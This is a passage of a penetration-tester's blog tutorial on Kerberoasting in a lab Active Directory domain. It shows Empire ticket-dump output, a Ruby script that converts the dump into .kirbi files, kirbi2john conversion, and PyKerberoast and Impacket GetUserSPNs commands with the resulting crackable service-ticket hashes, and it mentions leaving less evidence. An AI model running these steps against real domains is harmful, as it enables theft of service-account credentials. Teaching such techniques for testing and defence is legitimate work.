</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Rk</span><span class="o">+</span><span class="n">jggQFMIIEAaADAgESoQMCAQKiggPzBIID755axXlzQ6q8s93GffDw</span><span class="o">/</span><span class="n">YjUwy</span><span class="o">+</span><span class="n">U</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">KYB3hUdJijD2VtVPfHGnADl</span><span class="o">/</span><span class="n">pT2</span><span class="o">+</span><span class="n">Xuhu4uMOiVhsjUR</span><span class="o">/</span><span class="n">bfhIn8G1MkHPh3d3EtWx</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">oOvwZt8IsSE4pStAqrDCXAD9HbIi8G4QJ3dxMV875ThyihQKvp8ngHYRl8UfPXD</span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">YwuJhTm8OqDWiK2EgRDYX9VdtWktJp5FoVRBB4T0MAhMKqEZD5XNpNE6VGNBjJTQ</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Fq9</span><span class="o">/</span><span class="mi">82</span><span class="n">rfL0m4DkLXOnWxLy6iEL9mPg</span><span class="o">/</span><span class="n">etC4P8LQWu</span><span class="o">/</span><span class="n">UFbNf4enwSL93sgdq6XV6z</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">kAc</span><span class="o">+</span><span class="n">dv</span><span class="o">/</span><span class="mi">0</span><span class="n">gTkoHO</span><span class="o">+</span><span class="n">ci4ivQilomtAYtDLU7LLE1nOBC</span><span class="o">+</span><span class="mi">9</span><span class="n">gllB8rrnP6WOgIBzqC91K</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">WLk8cqsjjdacSLcqGJ38rFQQUhVmWcHRqzzn7iiCuTsRulsUZ5EF3kduOVPVzrcy</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">GA8yMDE2MDUxOTE1MzYwN1qmERgPMjAxNjA1MjAwMDUzMjRapxEYDzIwMTYwNTI2</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">MTQ1MzI0WqgSGxBTSVRUSU5HRFVDSy5JTkZPqSUwI6ADAgECoRwwGhsGa3JidGd0</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">GxBTSVRUSU5HRFVDSy5JTkZP</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">====================</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="o">*</span><span class="w"> </span><span class="n">Saved</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">file</span><span class="w">     </span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="o">-</span><span class="mi">60</span><span class="n">a10000</span><span class="o">-</span><span class="n">notanadmin</span><span class="o">@</span><span class="n">krbtgt</span><span class="o">~</span><span class="n">SITTINGDUCK</span><span class="p">.</span><span class="n">INFO</span><span class="o">-</span><span class="n">SITTINGDUCK</span><span class="p">.</span><span class="n">INFO</span><span class="p">.</span><span class="n">kirbi</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>I&rsquo;ve cut the result down quite a bit as it would scroll for a bit in this format.</p>
<p>Now the problem is that they are all text and for you to crack things or at least convert them into a format that JtR or oclHastcat can digest they need to be in binary format. So I made this script to convert and <code>agent.log</code> file from the output of <strong><code>extract_tickets</code></strong> back into their binary format with correct file names. My coding isn&rsquo;t great, so please let me know how I can improve this script:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env ruby</span>
</span></span><span class="line"><span class="cl"><span class="nb">require</span> <span class="s1">&#39;base64&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="no">ARGV</span><span class="o">.</span><span class="n">inspect</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="no">ARGV</span><span class="o">.</span><span class="n">length</span> <span class="o">!=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">	<span class="nb">puts</span> <span class="s2">&#34;Requires a file to parse, usually agent.log&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="nb">exit</span>
</span></span><span class="line"><span class="cl"><span class="k">end</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">border</span> <span class="o">=</span> <span class="s2">&#34;====================&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">bordercount</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">ticket</span> <span class="o">=</span> <span class="o">[]</span>
</span></span><span class="line"><span class="cl"><span class="n">filename</span> <span class="o">=</span> <span class="s2">&#34;failed.log&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="no">File</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">)</span><span class="o">.</span><span class="n">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">line</span><span class="o">|</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="n">line</span><span class="o">.</span><span class="n">strip</span> <span class="o">==</span> <span class="n">border</span>
</span></span><span class="line"><span class="cl">		<span class="k">case</span> <span class="n">bordercount</span>
</span></span><span class="line"><span class="cl">		<span class="k">when</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">			<span class="no">File</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="p">{</span><span class="o">|</span><span class="n">f</span><span class="o">|</span> <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="no">Base64</span><span class="o">.</span><span class="n">decode64</span><span class="p">(</span><span class="n">ticket</span><span class="o">.</span><span class="n">join</span><span class="p">))}</span>
</span></span><span class="line"><span class="cl">			<span class="n">bordercount</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">			<span class="n">ticket</span> <span class="o">=</span> <span class="o">[]</span>
</span></span><span class="line"><span class="cl">			<span class="n">filename</span> <span class="o">=</span> <span class="s2">&#34;failed.log&#34;</span>
</span></span><span class="line"><span class="cl">		<span class="k">else</span>
</span></span><span class="line"><span class="cl">			<span class="n">bordercount</span> <span class="o">=</span> <span class="n">bordercount</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">		<span class="k">end</span>
</span></span><span class="line"><span class="cl">	<span class="k">else</span>
</span></span><span class="line"><span class="cl">		<span class="k">case</span> <span class="n">bordercount</span>
</span></span><span class="line"><span class="cl">		<span class="k">when</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">			<span class="n">filename</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34; : &#34;</span><span class="p">)</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span>
</span></span><span class="line"><span class="cl">			<span class="nb">puts</span> <span class="s2">&#34;Storing </span><span class="si">#{</span><span class="n">filename</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">		<span class="k">when</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">			<span class="n">ticket</span> <span class="o">&lt;&lt;</span> <span class="n">line</span><span class="o">.</span><span class="n">strip</span>
</span></span><span class="line"><span class="cl">		<span class="k">end</span>
</span></span><span class="line"><span class="cl">	<span class="k">end</span>
</span></span><span class="line"><span class="cl"><span class="k">end</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Save that and just feed it an <code>agent.log</code> file from Empire and WA-LA! you have kirbi files.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ruby parse.rb agent.log
</span></span><span class="line"><span class="cl">[&#34;agent.log&#34;]
</span></span><span class="line"><span class="cl">Storing 0-60a10000-notanadmin@krbtgt~SITTINGDUCK.INFO-SITTINGDUCK.INFO.kirbi
</span></span><span class="line"><span class="cl">Storing 1-40e10000-notanadmin@krbtgt~SITTINGDUCK.INFO-SITTINGDUCK.INFO.kirbi
</span></span><span class="line"><span class="cl">Storing 2-40a10000-notanadmin@MSSQLSvc~WIN2K8R2.sittingduck.info-SITTINGDUCK.INFO.kirbi
</span></span><span class="line"><span class="cl">Storing 3-40a10000-notanadmin@http~win10.sittingduck.info-SITTINGDUCK.INFO.kirbi
</span></span><span class="line"><span class="cl">Storing 4-40a10000-notanadmin@kadmin~changepw-SITTINGDUCK.INFO.kirbi
</span></span><span class="line"><span class="cl">Storing 5-40a50000-notanadmin@ProtectedStorage~DC1.sittingduck.info-SITTINGDUCK.INFO.kirbi
</span></span><span class="line"><span class="cl">Storing 6-40a50000-notanadmin@cifs~dc1.sittingduck.info-SITTINGDUCK.INFO.kirbi
</span></span><span class="line"><span class="cl">Storing 7-40a50000-notanadmin@cifs~win2k8r2.sittingduck.info-SITTINGDUCK.INFO.kirbi
</span></span><span class="line"><span class="cl">Storing 8-40a50000-notanadmin@ldap~win2k8r2.sittingduck.info~sittingduck.info-SITTINGDUCK.INFO.kirbi
</span></span><span class="line"><span class="cl">Storing 9-40a50000-notanadmin@ldap~dc1.sittingduck.info-SITTINGDUCK.INFO.kirbi
</span></span><span class="line"><span class="cl">Storing 10-40a50000-notanadmin@LDAP~DC1.sittingduck.info~sittingduck.info-SITTINGDUCK.INFO.kirbi
</span></span></code></pre></td></tr></table>
</div>
</div><p>Next we need to convert those binary tickets into something crackable. That is where <strong><code>kirbi2john.py</code></strong> comes in.</p>
<h3 id="kirbi2john">Kirbi2John</h3>
<p>There are two versions of &ldquo;kirbi2john&rdquo;.</p>
<ul>
<li><a href="https://github.com/nidem/kerberoast/blob/master/kirbi2john.py" target="_blank" rel="noopener noreffer ">Kerberoast version of kirbi2john.py by Michael Kramer (SySS GmbH)</a></li>
<li><a href="https://github.com/magnumripper/JohnTheRipper/blob/bleeding-jumbo/run/kirbi2john.py" target="_blank" rel="noopener noreffer ">John the Ripper&rsquo;s version of kirbi2john.py by Michael Kramer - modded by Dhiru Kholia</a></li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root@wpad:~/johntheripper/run# ./kirbi2john.py /root/empire-dev/downloads/BDW3E2G2ZRKCUS3B/*.kirbi
</span></span><span class="line"><span class="cl">$krb5tgs$unkown:9e5ac5797343aabcb3ddc67df0f0fd88$d4c32f942980778547498a30f656d54f7c71a700397fa53dbe5ee86ee2e30e89586c8d447f6df8489fc1b53241cf87777712d5b1a0ebf066df08b12138a52b40aab0c25c00fd1db222f06e10277771315f3be538728a140abe9f2780761197c51f3d70fe630b898539bc3aa0d688ad848110d85fd55db5692d269e45a154410784f430084c2aa1190f95cda4d13a5463418c94d016af7ff36adf2f49b80e42d73a75b12f2ea210bf663e0fdeb42e0ff0b416bbf5056cd7f87a7c122fddec81daba5d5eb390073e76fff48139281cef9c8b88af4229689ad018b432d4ecb2c4d673810bef6096507caeb9cfe963a0201cea0bdd4a58b93c72ab238dd69c48b72a189dfcac541052156659c1d1ab3ce7ee2882b93b11ba5b14679105de476e3953d5ceb7328a5d221cfd323b7deb8234be1bf0d4b8c9f02463ad6da667323478f7acba2424e4311c837db608fc27b25a24d6c1315d7927d165a0859460ed65aaabaffd488b23dfcb01c8866aad556831370e89c25a6d8843aae676186f927eadf86f187d355f4a1d97472a44dc32fc52c4b6c40f42bb84f8589ee607eff2fd511bb6eaae90640a6dd2b3557ae5ae992d025aa13c25fafe9bd5b93aa36834a715c5dcde96bda38b880797852d2cff13324a1751a9b198b60ebf81c96b8dc5edf1474fe1fa53628f3aa53416e4062c503f1efb22a8ce11ab7ba8c40bc30c816568091ad051c55b3c8780964c87b5db241224bd3280eecb7e73f2921c770ccf41fbea8e43b2a1be0c6178c799fdbe8d1fffdd4a37a2aeeebb27a4f09f669203969b80e1ab7d6e28cae00af7fd3a6c731448c97356759ecc3eefec7f6ef155bd63b84bb25b1b66f8f1908ece15dbba12219c80b6797e04315889790f9c06c611314f8cd
</span></span></code></pre></td></tr></table>
</div>
</div><p>But all of that is hard and creates evidence. Lets look back at the tools <a href="https://github.com/skelsec/PyKerberoast" target="_blank" rel="noopener noreffer ">PyKerberoast</a> and <a href="https://github.com/CoreSecurity/impacket/blob/master/examples/GetUserSPNs.py" target="_blank" rel="noopener noreffer ">Impacket&rsquo;s GetUserSPNs.py</a> and see if there is a better way:</p>
<h2 id="pykerberoast">PyKerberoast</h2>
<ul>
<li>Source: <a href="https://github.com/skelsec/PyKerberoast" target="_blank" rel="noopener noreffer ">https://github.com/skelsec/PyKerberoast</a></li>
<li>Requirements: <code>python-ldap</code></li>
</ul>
<p>This awesome work by <a href="https://twitter.com/skelsec" target="_blank" rel="noopener noreffer ">@skelsec</a> makes it so no new Kerberos tickets need to be added to the client, no use of Mimikatz, and no need to parse anything, it just contacts the Domain Controller. It pulls out all of the information needed for the SPNs, requests the tickets and outputs them in John the Ripper format.</p>
<p>Usage:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">kerberoastv2.py [-h] -a ADSERVER -b LDAPBASE -d DOMAIN -u USERNAME
</span></span><span class="line"><span class="cl">                [-p PASSWORD] [-o OUTPUTFILE] [-em ENUMMACHINE] [-v]
</span></span></code></pre></td></tr></table>
</div>
</div><p>Example (I have snipped up some of the output to save space):</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root@wpad:~/pykerberoast# python kerberoastv2.py -a 192.168.168.10 -b &#34;dc=sittingduck,dc=info&#34; -d sittingduck -u notanadmin
</span></span><span class="line"><span class="cl">[+]Starting...
</span></span><span class="line"><span class="cl">Password:
</span></span><span class="line"><span class="cl">$krb5tgs$23$*uberuser$SITTINGDUCK.INFO$spn*$4da625ffd63dad7676effe133dcb9c1b$af52b31c7c39808f02bceb2d728550e375ff7321f7383f4800445df2a27006950a0f88c69a447de1643a7418f056315c684382068701a62f627c6cafde81bbc657c865ddd828027cef1edc11228ea0b95caca91647fc4b581efb380e466d12e253309d65a11dcbe02b0de70e0aa9044350461ad5d4293a07e3cf588a05a04a7942b63f395c6eed5e8dc826160a7bc00e295df539e419b9a4c17762b3bc987bc339354892e51090d7a7ede236cf500438e57f47a4155cc38f8a07cfdb2e3f7033ce412a6f7856911d9cf95e659daf4269d1b31cf872b09dc86af614b95c457fc896d01fdfb0afc751d2279d4c715
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[+]Done!
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="impacket">Impacket</h2>
<ul>
<li>Original Discussion: <a href="https://github.com/CoreSecurity/impacket/pull/153#issuecomment-218438868" target="_blank" rel="noopener noreffer ">https://github.com/CoreSecurity/impacket/pull/153#issuecomment-218438868</a></li>
<li>Added May 13 2016: <a href="https://github.com/CoreSecurity/impacket/commit/2a185c1ecc0b0a56467f12dfccbd5672ed95adaa" target="_blank" rel="noopener noreffer ">https://github.com/CoreSecurity/impacket/commit/2a185c1ecc0b0a56467f12dfccbd5672ed95adaa</a></li>
<li>Source: <a href="https://github.com/CoreSecurity/impacket/blob/master/examples/GetUserSPNs.py" target="_blank" rel="noopener noreffer ">https://github.com/CoreSecurity/impacket/blob/master/examples/GetUserSPNs.py</a></li>
</ul>
<p>Just by adding a <strong><code>-request</code></strong> to our previous run we can request all of the user SPN tickets and they are output in John the Ripper format (I&rsquo;ve snipped up some of the output to save space):</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root@wpad:~/impacket/examples# ./GetUserSPNs.py -request sittingduck.info/notanadmin
</span></span><span class="line"><span class="cl">Impacket v0.9.15-dev - Copyright 2002-2016 Core Security Technologies
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Password:
</span></span><span class="line"><span class="cl">ServicePrincipalName                Name        MemberOf                                              PasswordLastSet
</span></span><span class="line"><span class="cl">----------------------------------  ----------  ----------------------------------------------------  -------------------
</span></span><span class="line"><span class="cl">http/win10.sittingduck.info         uberuser    CN=Enterprise Admins,CN=Users,DC=sittingduck,DC=info  2015-11-10 23:47:21
</span></span><span class="line"><span class="cl">MSSQLSvc/WIN2K8R2.sittingduck.info  sqladmin01                                                        2016-05-13 19:13:20
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$krb5tgs$23$*sqladmin01$SITTINGDUCK.INFO$SPN*$6e5307df490c6e3339f613fdc5655785$80ba233b4d24531202f2e354c99e7eda807bde7aeeb48ee4cdb6bf809d78652413699e3cff8b9b78b9ee70e997a538155fc7f72e208d715020d458b8413d4b12b212738833c4694d84937d65cb8ecd0020c00a5d39c07da35a748ea2cb062fca4fa9b282e7046d70ee1cae4cfee7d6f791052e283
</span></span><span class="line"><span class="cl">$krb5tgs$23$*uberuser$SITTINGDUCK.INFO$SPN*$27c08ed2a8d5394f66e8c13c25c98393$310b787ec5c10b20fcc0acb1406b6a6e2ffddd71de3dc4c70c19e5dfcf262cc88574e61cb3940ebfd574b2bb555f2b05f84d8526e3cf46fc0ca57e03467729757cbf79da9f55cde9dabdda68e80dce6564e9f1b904b0585dbc813b82abf89e973e41c102b664f4c649f85acaf7904a273dddcb9315a66f27334f313190e1caf4f5055b671d250f5912cc1871a1dd4a6126087ddfb98ade8f7dde495ee8ad76583aa5a12eef63a690dd82a15eaaca0d7594f2f1dbc899035d89dd628b291590058cfb3405d1dfe4a383be5704465d9c8972ef8f1cba3541fdfa7dcf5063eaed74051fa18bd73f7b4f7d77
</span></span></code></pre></td></tr></table>
</div>
</div><p>Much easier ;-) oh, and did I mention that if you use Impacket&rsquo;s version you can just use LM/NTLM hashes instead of a password? Awesome! Alright, all we have left is to crack these tickets and figure out how to use them&hellip;</p>
<h1 id="references">References:</h1>
<h2 id="tools">Tools</h2>
<ul>
<li><a href="https://github.com/nidem/kerberoast" target="_blank" rel="noopener noreffer ">Kerberoast</a></li>
<li><a href="https://github.com/coresecurity/impacket" target="_blank" rel="noopener noreffer ">Impacket</a></li>
<li><a href="https://github.com/skelsec/PyKerberoast" target="_blank" rel="noopener noreffer ">PyKerberoast</a></li>
<li><a href="https://github.com/magnumripper/JohnTheRipper" target="_blank" rel="noopener noreffer ">Github - John the Ripper - Magnumripper</a></li>
<li><a href="https://github.com/hashcat/oclHashcat" target="_blank" rel="noopener noreffer ">Github - oclHashcat</a></li>
</ul>
<h2 id="presentations">Presentations</h2>
<ul>
<li>Tim Medin&rsquo;s Slides - [Kicking the Guard Dog of Hades - slides](<a href="https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin%281" target="_blank" rel="noopener noreffer ">https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1</a>).pdf)</li>
<li>Tim Medin&rsquo;s Video - <a href="https://www.youtube.com/watch?v=PUyhlN-E5MU&amp;feature=youtu.be" target="_blank" rel="noopener noreffer ">Kicking the Guard Dog of Hades - video</a></li>
</ul>
<h2 id="other-write-ups">Other write ups</h2>
<ul>
<li><a href="http://malwarejake.blogspot.com/2015/11/kerberos-silver-tickets-unique-attacker.html" target="_blank" rel="noopener noreffer ">Jacob Williams (MalwareJake) post about Silver Tickets being using in the wild</a></li>
<li><a href="https://www.beneaththewaves.net/Projects/Mimikatz_20_-_Brute-Forcing_Service_Account_Passwords.html" target="_blank" rel="noopener noreffer ">Ben Lincoln&rsquo;s writeup on Brute Forcing Service Account Passwords</a></li>
<li><a href="https://leonjza.github.io/blog/2016/01/09/kerberos-kerberoast-and-golden-tickets/" target="_blank" rel="noopener noreffer ">Leon Jacob&rsquo;s writeup on Kerberoast</a></li>
<li><a href="https://adsecurity.org/?p=2293" target="_blank" rel="noopener noreffer ">Sean Metcalf&rsquo;s writeup on Kerberoast</a></li>
<li><a href="https://adsecurity.org/?page_id=183" target="_blank" rel="noopener noreffer ">Sean Metcalf&rsquo;s SPN directory</a></li>
</ul>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2016-05-21</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://malicious.link/posts/2016/kerberoast-pt2/" data-title="Kerberoasting - Part 2" data-via="mubix" data-hashtags="kerberos,impacket,empire,powershell,spn,mimikatz"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://malicious.link/posts/2016/kerberoast-pt2/" data-hashtag="kerberos"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://malicious.link/posts/2016/kerberoast-pt2/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://malicious.link/posts/2016/kerberoast-pt2/" data-title="Kerberoasting - Part 2"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://malicious.link/posts/2016/kerberoast-pt2/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://malicious.link/posts/2016/kerberoast-pt2/" data-title="Kerberoasting - Part 2"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Evernote" data-sharer="evernote" data-url="https://malicious.link/posts/2016/kerberoast-pt2/" data-title="Kerberoasting - Part 2"><i class="fab fa-evernote fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/kerberos/">kerberos</a>,&nbsp;<a href="/tags/impacket/">impacket</a>,&nbsp;<a href="/tags/empire/">empire</a>,&nbsp;<a href="/tags/powershell/">powershell</a>,&nbsp;<a href="/tags/spn/">spn</a>,&nbsp;<a href="/tags/mimikatz/">mimikatz</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/posts/2016/kerberoast-pt1/" class="prev" rel="prev" title="Kerberoasting - Part 1"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Kerberoasting - Part 1</a>
            <a href="/posts/2016/kerberoast-pt3/" class="next" rel="next" title="Kerberoasting - Part 3">Kerberoasting - Part 3<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2005 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://twitter.com/mubix" target="_blank">Rob Fuller</a></span>&nbsp;|&nbsp;<span class="license">All Rights Reserved</span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":100},"comment":{},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
